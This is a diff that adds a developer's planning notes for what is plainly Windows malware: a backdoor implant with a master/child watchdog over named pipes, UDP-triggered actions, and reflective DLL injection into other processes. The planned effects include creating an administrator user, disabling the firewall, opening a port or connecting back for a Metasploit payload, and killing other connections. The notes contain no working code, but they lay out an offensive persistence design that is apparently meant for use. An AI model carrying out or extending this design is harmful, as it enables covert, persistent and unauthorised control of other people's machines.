@@ -1,0 +1,70 @@
+Main
+ + May have to rewrite into dll/harness model
+ - would allow for easier dll injection.
+ - need a named pipe observation utility
+
+Effects
+ - create specified user and password and add to administrators group if possible
+ - drop firewall
+ - change background of computer
+
+Packetwatch (changed to udp)
+ - open fw 
+ + perform actions
+ - trigger effects? (need handle to effects)
+ + open port for metasploit payload (use git metasploit_payload stuff)
+ + connectback for metasploit payload
+ - kill other connections 
+
+keepalive
+ - get process list
+ - pick a target
+ - attach to target
+ - inject code
+   - https://github.com/stephenfewer/ReflectiveDLLInjection
+   - https://github.com/rapid7/ReflectiveDLLInjection
+ - create thread
+
+
+ - learn named pipe stuff for keep alive comms
+   - Master doesn't talk network
+   - deploys and watches child(ren)?
+   - One child active at a time
+   - If child dies, new child is deployed.
+   - What if master dies?
+
+   Pipe Protocol.
+   >> master alive (every 10 seconds)
+   >> if no master after 20 seconds, child takes over
+   >> child needs to kill it's packetwatch and effects thread and listener threads
+   >> Die on global variable masterflag.... loops can test it.  Multithread, but they only read... think that's ok.
+   >> may have to send a packet on UDP to cause PacketWatch to die
+   >> need to know if I can do a select on the pipe... I think I can.
+
+
+   Hmmm.  Is there a need for a seperate packetwatch and keepalive?
+   Client can talk to master for keep alive... Master shouldn't have packet watch socket anyway.
+
+   |           |  PacketSocket |
+   |Master     |               |
+   |Client     |       X       |
+
+   So Master checks client by sending packet every 5 seconds.
+   Done in Packetwatch when master state?
+   Master that gets a conn refused needs to make a new client.
+   what does conn refused look like in c?
+
+   Client has socket receives packets on regular basis.
+   Time elapsed on master heartbeat.  
+    - Client becomes master
+	- closes udp socket
+	- new master makes a client
+	- new client binds to udp
+
+	So new packetwatch will look like-----
+
+	master = true
+	while (1=1)
+	   - if socket gone, make one
+	   - hmm... bind if client, connect if master dumb to do it every loop though.
+	   - close and remake when switching roles.
